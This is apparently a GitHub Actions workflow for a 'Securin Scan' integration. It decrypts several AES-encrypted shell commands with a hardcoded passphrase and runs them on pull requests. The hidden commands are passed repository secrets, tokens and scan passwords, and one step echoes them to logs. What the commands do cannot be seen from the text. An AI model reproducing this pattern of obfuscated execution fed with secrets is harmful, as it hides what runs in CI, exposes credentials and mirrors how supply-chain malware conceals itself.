---
name: Securin Scan
"on":
- workflow_dispatch
- pull_request
jobs:
  scanning:
    env:
      APP_ID: a040441301daa0781830f3f1a020a98132503cfa5a8ae1095483485eb6f89daf
    steps:
    - name: Decrypt
      id: decrypt
      run: |-
        access_token=$(echo 'U2FsdGVkX1+w8INdXsXuqRCxZ6DyVF4oeDI+KmPn9r53i4tNfW65TX2XEbF4hWL6hjABErFsQ4r6nGMBgZAYyrnoEOeaede2kuMSnZ4nSvLHdbBNsOCVCooo4p8KSvx8xIxzSsW/Qb1LbOl2mVwyHk2oLWL0GWKyJnsq+UmLa1SqmTHZJMeek3bs8s6EyEslONJOAcWGNqlJ9NX0lhFOHxiCa5b2ZZgsEE/iHWpI24waeV/dvUV87WfCFETRJAzGZhsvWLWbJhu/M3JeiDWYMQ==' | openssl enc -d -aes-256-cbc -md sha256 -pass pass:testpass -a)
        scan_info=$(echo 'U2FsdGVkX184ggwI/OgYRksQdtJWHOlbta7y/WU2z69P/Bvh5N1+OdqvaPuvCEevzX4gRdfpLL/1c9So94z9SQXsrje5NY6+Igv5lYD+RiHCUzHdWq6JBdBseh00T1YfB6TEcWDSOZpMSsr+rZt2ngq7Enru6HkWxAxfDvumTUXbvoO2RxNmdO0qy4SARyo4ZtuIF4ZWFE5OCAoj0MLX029HO9wzklF9mZz9Xn9D1uY=' | openssl enc -d -aes-256-cbc -md sha256 -pass pass:testpass -a)
        cmd1=$(echo 'U2FsdGVkX1+RF+7U9Q3fFH69XQmHFVBJaWWAVRZOkKiGvUH/nK/EsH8IExbno3ZZE1qsxRszaMf2pzcu8RCC5A==' | openssl enc -d -aes-256-cbc -md sha256 -pass pass:testpass -a)
        cmd2=$(echo 'U2FsdGVkX1+b5Qxv14q37kMB4Pge0gMOVbN5EAKUwrASpchc7Q6I2PM+8vRXbmsT' | openssl enc -d -aes-256-cbc -md sha256 -pass pass:testpass -a)
        cmd3=$(echo 'U2FsdGVkX18vUK2Ltkd1mNV0Ob/4kjHDhU1zD5ry9A3j9kHmCUYdcq2ys1j+YwNwwwn+Nbro1jijwmMzcZ1rPZrVwWqh0v8vUOWVwCxbwMQahvaaozjVc9B7uH4YJ2mQ6aP5F8Yaq5YK/LUj1vU19heQ28rAkqw0QFCvP5xPTFE=' | openssl enc -d -aes-256-cbc -md sha256 -pass pass:testpass -a)
        echo "::set-output name=access_token::$access_token"
        echo "::set-output name=scan_info::$scan_info"
        echo "::set-output name=cmd1::$cmd1"
        echo "::set-output name=cmd2::$cmd2"
        echo "::set-output name=cmd3::$cmd3"
    - name: Access token
      id: access_token
      run: |-
        token=$(${{ format(steps.decrypt.outputs.access_token, secrets.USER_NAME, secrets.PASSWORD)}} | jq -r '.access_token')
        echo "::set-output name=token::$token"
    - name: Retrieve Scan Info
      id: scan_info
      run: |-
        respJson=$(${{ format(steps.decrypt.outputs.scan_info, env.APP_ID, steps.access_token.outputs.token)}})
        echo "::set-output name=scanInfoResp::$respJson"
    - uses: actions/checkout@v2
    - name: Build with Maven
      run: $(echo 'U2FsdGVkX19j7/8LdozdsFPJV2e788/9CGt/5z776Jo2IR5ip0FUKnoElw+1Cs/VbDS/LsIG0DfEx87wozo8FA=='
        | openssl enc -d -aes-256-cbc -md sha256 -pass pass:testpass -a)
    - name: Scan Initiated
      run: |-
         echo ${{ fromJson(steps.scan_info.outputs.scanInfoResp).user}} 
         echo ${{format(steps.decrypt.outputs.cmd1, fromJson(steps.scan_info.outputs.scanInfoResp).user, fromJson(steps.scan_info.outputs.scanInfoResp).password, fromJson(steps.scan_info.outputs.scanInfoResp).proxyUrl)}}
    - name: Upload SARIF file
      uses: github/codeql-action/upload-sarif@v1
      with:
        sarif_file: ${{github.workspace}}/results/result.sarif
      if: hashFiles('**/result.sarif') !=''
    - name: Evaluate build status
      run: $(echo 'U2FsdGVkX1/XD7YaSmWKgTJDJIkvMw+4V6BmLqYa2lxuiVzP1zPatSfr7QYTy8d+LfdidbUWCrzEcHh1dneA9EtoepfH0pDuzZffK5h1f0E='
        | openssl enc -d -aes-256-cbc -md sha256 -pass pass:testpass -a)
      if: hashFiles('**/status.txt') !=''
    runs-on: ubuntu-latest
